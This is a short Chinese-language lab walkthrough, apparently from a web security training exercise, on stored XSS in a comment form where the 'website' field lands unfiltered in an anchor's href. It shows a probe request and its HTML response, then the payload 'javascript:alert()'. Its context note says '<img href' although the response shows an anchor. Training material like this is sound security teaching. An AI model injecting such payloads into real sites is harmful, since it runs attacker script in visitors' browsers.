# 实验：双引号经过 HTML 编码的锚点 `href` 属性中的存储型 XSS

本实验在评论功能中包含一个存储型跨站脚本漏洞。为了解决本实验，请提交一条评论，使得当点击评论作者姓名时调用 `alert` 函数。

## 步骤

探测
- 提交评论，填充各字段

    ```http
    POST /post/comment HTTP/2

    csrf=7LuAEsineXPwsKEfk5hFYMooPOzq18Vp&postId=3&comment=aaaaaaaaaaaaaaaaa&name=bbbbbbbbbbbbbbb&email=cccccccccccccc%40ccccccccc&website=ddddddddddddddddddd
    ```

    - 响应

        ```html
        <section class="comment">
            <p>
                <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="ddddddddddddddddddd">bbbbbbbbbbbbbbb</a> | 15 July 2026
            </p>
            <p>aaaaaaaaaaaaaaaaa</p>
            <p></p>
        </section>
        ```
        - 其中 `website` 字段并未过滤
            - 上下文 `<img href="`

攻击
- 在 website 字段构造 JS 伪协议
    `website=javascript:alert()`
